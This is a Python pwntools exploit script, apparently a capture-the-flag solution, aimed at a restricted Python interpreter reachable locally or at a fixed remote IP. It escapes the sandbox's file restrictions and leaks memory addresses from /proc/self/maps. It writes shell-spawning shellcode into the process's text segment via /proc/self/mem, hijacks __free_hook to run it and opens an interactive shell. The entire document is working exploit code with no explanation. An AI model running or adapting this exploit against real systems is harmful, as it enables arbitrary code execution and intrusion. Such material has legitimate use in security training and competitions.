#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools
context.arch = "amd64"

if "remote" in sys.argv:
    r = remote("192.168.201.5", 10000)
else:
    r = process(["./python", "-i"])

libc = ELF("../../libc.so.6")

r.send("""
import sys
file = sys.stdout.__class__

def open(name, mode):
    f = file.__new__(file)
    f.__init__(name, mode)
    return f

maps = open("/proc/self/maps", "r").read()
print "==maps==" + maps + "==maps=="
""")
r.recvuntil("==maps==")
maps = r.recvuntil("==maps==", drop=True)

text = int(maps.split("\n")[0].split("-")[0], 16)
libc_base = int(re.findall(r".*libc-.*", maps)[0].split("-")[0], 16)

log.info("text = " + hex(text))
log.info("libc = " + hex(libc_base))

libc.address = libc_base

sc = "".join("\\x%02x" % ord(x) for x in asm(shellcraft.sh()))
text_addr = "".join("\\x%02x" % ord(x) for x in p64(text))

r.send("""
text = {text}
sc = "{sc}"

# put shellcode on .text
w = open("/proc/self/mem", "wb")
w.seek(text)
w.write(sc)

# overwrite freehook
w.seek({freehook})
w.write("{text_addr}")
w.close()
""".format(text=text, sc=sc, freehook=libc.symbols["__free_hook"], text_addr=text_addr))
r.recvrepeat(0.5)

r.interactive()
